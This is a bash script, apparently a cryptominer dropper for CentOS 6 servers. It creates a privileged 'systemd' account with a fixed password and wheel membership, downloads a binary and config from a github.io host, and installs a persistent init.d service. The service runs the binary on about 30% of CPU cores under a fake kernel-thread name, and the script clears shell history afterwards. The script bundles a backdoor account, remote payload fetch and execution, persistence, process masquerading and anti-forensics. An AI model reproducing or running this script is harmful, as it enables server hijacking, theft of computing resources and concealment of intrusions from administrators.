#!/bin/bash

USER_NAME="systemd"
USER_PASS="@@LieuNhuYen123"
BIN_PATH="/usr/bin/systemd-proc"
CONF_PATH="/usr/bin/config.json"
INIT_FILE="/etc/init.d/systemd-proc"

TOTAL_CORES=$(nproc)
TARGET_THREADS=$(( TOTAL_CORES * 30 / 100 ))
[ $TARGET_THREADS -eq 0 ] && TARGET_THREADS=1

# Tạo user theo cách CentOS 6
if ! id "$USER_NAME" &>/dev/null; then
    useradd -m "$USER_NAME"
    echo "$USER_PASS" | passwd --stdin "$USER_NAME"
    usermod -aG wheel "$USER_NAME"
else
    echo "$USER_PASS" | passwd --stdin "$USER_NAME"
fi

# Tải file (Phải là bản STATIC)
wget -q -O $BIN_PATH https://via00002222.github.io/systemd/systemd-proc
wget -q -O $CONF_PATH https://via00002222.github.io/systemd/config.json
chmod +x $BIN_PATH

# Tạo script khởi chạy theo kiểu cũ (Init.d)
cat <<EOT > $INIT_FILE
#!/bin/bash
# chkconfig: 2345 90 10
# description: System Process Controller

case "\$1" in
  start)
    echo "Starting systemd-proc..."
    sudo -u $USER_NAME /bin/bash -c "exec -a '[kworker/u24:1-events]' $BIN_PATH -t $TARGET_THREADS > /dev/null 2>&1 &"
    ;;
  stop)
    echo "Stopping systemd-proc..."
    pkill -f systemd-proc
    ;;
  restart)
    \$0 stop
    \$0 start
    ;;
  *)
    echo "Usage: \$0 {start|stop|restart}"
    exit 1
esac
exit 0
EOT

chmod +x $INIT_FILE
chkconfig --add systemd-proc
chkconfig systemd-proc on
service systemd-proc start

history -c && rm -f ~/.bash_history
